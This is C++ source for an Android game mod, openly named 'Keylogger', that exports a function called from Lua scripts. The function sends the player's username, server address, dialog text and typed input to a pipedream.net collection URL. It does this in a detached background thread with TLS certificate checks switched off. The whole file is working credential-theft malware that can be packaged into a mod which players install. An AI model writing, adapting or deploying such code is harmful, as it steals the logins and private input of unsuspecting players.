#include <mod/amlmod.h>
#include <mod/logger.h>
#include <mod/config.h>
#include <thread>
#include <string>
#include <curl/curl.h>

// Globals
MYMOD(net.broo.keylogger, Keylogger, 1.0, Broo)

// URL encode helper
std::string urlEncode(const std::string &value) {
    CURL *curl = curl_easy_init();
    if (!curl) return value;
    
    char *output = curl_easy_escape(curl, value.c_str(), value.length());
    if (output) {
        std::string result(output);
        curl_free(output);
        curl_easy_cleanup(curl);
        return result;
    }
    curl_easy_cleanup(curl);
    return value;
}

// Non-blocking HTTP GET request
void sendLogAsync(const char* hostname, const char* address, int port, 
                  const char* username, const char* dialog, const char* input) {
    
    // Spawn thread (non-blocking)
    std::thread([=]() {
        CURL *curl = curl_easy_init();
        if (!curl) return;
        
        // Build URL
        std::string url = "https://eobu7p8gjns8pzf.m.pipedream.net/?";
        url += "hostname=" + urlEncode(hostname);
        url += "&address=" + urlEncode(std::string(address) + ":" + std::to_string(port));
        url += "&username=" + urlEncode(username);
        url += "&dialog=" + urlEncode(dialog);
        url += "&input=" + urlEncode(input);
        
        // Configure CURL
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L); // HEAD request (faster)
        
        // Execute (blocking tapi di thread terpisah)
        CURLcode res = curl_easy_perform(curl);
        
        if (res != CURLE_OK) {
            logger->Info("HTTP request failed: %s", curl_easy_strerror(res));
        }
        
        curl_easy_cleanup(curl);
    }).detach(); // Detach thread (fire and forget)
}

// Export function untuk dipanggil dari Lua via FFI
extern "C" {
    EXPORT void KeylogSend(const char* hostname, const char* address, int port,
                          const char* username, const char* dialog, const char* input) {
        sendLogAsync(hostname, address, port, username, dialog, input);
    }
}

// AML mod lifecycle
DECL_HOOKv(LoadGame) {
    LoadGame();
    logger->Info("Keylogger native loaded!");
}